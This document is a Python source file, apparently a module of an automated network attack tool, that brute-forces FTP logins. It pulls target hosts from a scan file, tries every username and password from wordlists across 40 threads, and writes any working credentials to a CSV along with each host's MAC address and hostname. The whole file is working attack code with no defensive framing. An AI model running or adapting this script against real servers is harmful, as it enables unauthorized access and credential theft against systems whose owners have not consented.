import os
import csv
import threading
import logging
import time
from ftplib import FTP
from queue import Queue
from shared import SharedData
from logger import Logger

logger = Logger(name="ftp_connector.py", level=logging.DEBUG)

b_class = "FTPBruteforce"
b_module = "ftp_connector"
b_status = "brute_force_ftp"
b_port = 21
b_parent = None

class FTPBruteforce:
    """
    This class handles the FTP brute force attack process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ftp_connector = FTPConnector(shared_data)
        logger.info("FTPConnector initialized.")

    def bruteforce_ftp(self, ip, port):
        """
        Initiates the brute force attack on the given IP and port.
        """
        return self.ftp_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """
        Executes the brute force attack and updates the shared data status.
        """
        self.shared_data.bjornorch_status = "FTPBruteforce"
        # Wait a bit because it's too fast to see the status change
        time.sleep(5)
        logger.info(f"Brute forcing FTP on {ip}:{port}...")
        success, results = self.bruteforce_ftp(ip, port)
        return 'success' if success else 'failed'

class FTPConnector:
    """
    This class manages the FTP connection attempts using different usernames and passwords.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "21")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.ftpfile = shared_data.ftpfile
        if not os.path.exists(self.ftpfile):
            logger.info(f"File {self.ftpfile} does not exist. Creating...")
            with open(self.ftpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for FTP ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "21")

    def ftp_connect(self, adresse_ip, user, password):
        """
        Attempts to connect to the FTP server using the provided username and password.
        """
        try:
            conn = FTP()
            conn.connect(adresse_ip, 21)
            conn.login(user, password)
            conn.quit()
            logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
            return True
        except Exception as e:
            return False

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.ftp_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            with self.progress_lock:
                self.progress_count += 1
                if self.progress_count % 50 == 0:
                    logger.info(f"Bruteforcing FTP... {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        # Find the row for this IP
        mac_address = ""
        hostname = ""
        for row in self.scan:
            if row.get('IPs') == adresse_ip:
                mac_address = row.get('MAC Address', '')
                hostname = row.get('Hostnames', '')
                break

        total_tasks = len(self.users) * len(self.passwords) + 1  # Include one for the anonymous attempt
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing FTP on {adresse_ip}... (0/{total_tasks})")

        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                while not self.queue.empty():
                    self.queue.get()
                    self.queue.task_done()
                break

        self.queue.join()

        for t in threads:
            t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Saves the results of successful FTP connections to a CSV file.
        """
        with open(self.ftpfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Removes duplicate entries from the results file.
        """
        rows = []
        header = None
        if os.path.exists(self.ftpfile):
            with open(self.ftpfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.ftpfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ftp_bruteforce = FTPBruteforce(shared_data)
        logger.info("Starting FTP attack on port 21...")

        # Load the IPs to scan from shared data
        ips_to_scan = shared_data.read_data()

        # Execute brute force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            ftp_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total successful attempts: {len(ftp_bruteforce.ftp_connector.results)}")
        exit(len(ftp_bruteforce.ftp_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
